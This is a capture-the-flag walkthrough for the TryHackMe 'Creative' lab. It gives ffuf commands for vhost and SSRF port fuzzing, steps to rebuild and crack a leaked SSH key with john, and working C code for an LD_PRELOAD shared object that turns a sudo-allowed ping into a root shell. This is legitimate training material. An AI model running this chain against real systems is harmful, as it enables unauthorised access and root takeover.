# 🧨 Creative — README 
---

## TL;DR (for impatient heroes)

* Scan: ports `22` and `80`. Big surprise: web stuff.
* Vhost fuzz → `beta.creative.thm`. You’re doing better than 90% of people who just run gobuster and cry.
* SSRF fuzz the site → `localhost:1337` serving files → found a **squashed** `id_rsa` (yeah, someone copy-pasted it like an amateur).
* Fix the key, crack the passphrase with `ssh2john` + `john` (lab only — you know the rules).
* SSH in as `saad`. Run `sudo -l`. It says you can run `/usr/bin/ping` as root and `LD_PRELOAD` is preserved. Jackpot.
* Compile tiny `.so`, `LD_PRELOAD` it into `ping` via `sudo` → root shell. Sip cold victory water.

---

## What you’ll run

I left out the baby-talk — you asked for commands, here they are. Don’t break stuff outside the lab.

```bash
# vhost fuzz — find beta.creative.thm
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://creative.thm -H "Host:FUZZ.creative.thm" -t40 -fw6

# build port list (so you don’t complain about missing wordlists)
python3 -c "print('\\n'.join(map(str,range(1,65536))))" > port.txt

# SSRF fuzz to find localhost ports exposed via the site
ffuf -w port.txt:FUZZ -u http://beta.creative.thm/ -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http://127.0.0.1:FUZZ" -fw3 -t50

# if you find a one-line/messed key, fix it (reformats to proper OpenSSH PEM)
cat badkey.txt | tr -d ' \n' | fold -w64 \
  | sed '1i-----BEGIN OPENSSH PRIVATE KEY-----' \
  | sed '$a-----END OPENSSH PRIVATE KEY-----' > id_rsa && chmod 600 id_rsa

# get passphrase (lab permitted)
ssh2john.py id_rsa > id.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id.hash
john --show id.hash

# post-auth: check sudo
sudo -l

# LD_PRELOAD PoC (lab only — do not be a tool IRL)
cat > /tmp/exp.c <<'EOF'
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor)) static void init(void) {
  setgid(0); setuid(0);
  unsetenv("LD_PRELOAD");
  execl("/bin/sh","sh","-p",NULL);
}
EOF

gcc -fPIC -shared -o /tmp/exp.so /tmp/exp.c
chmod 700 /tmp/exp.so
sudo LD_PRELOAD=/tmp/exp.so /usr/bin/ping -c1 127.0.0.1
# if you get a shell:
id
rm -f /tmp/exp.c /tmp/exp.so
```

---

## Quick brain-dump (so you don’t mess it up)

* `ffuf -fw` filters by **word count** — use it to cut noise, not to be lazy.
* If `ssh` asks for a passphrase, don’t try to “guess” the server password — that’s not how this works. Use the `ssh2john -> john` path in the lab.
* `LD_PRELOAD` only works on **dynamically linked** binaries. `file /usr/bin/ping` is your friend. If `ping` is static, go sulk somewhere else.
* Clean up after yourself: `rm /tmp/exp.*`. Don’t leave sloppy footprints.

---

## Ethics (yes, I’ll nag)

This is TryHackMe lab content only. You already knew that, but I gotta say it loud because some people are allergic to rules: *do not run this on random servers*. You won’t be “pwned”, you’ll be prosecuted. Cool?

---
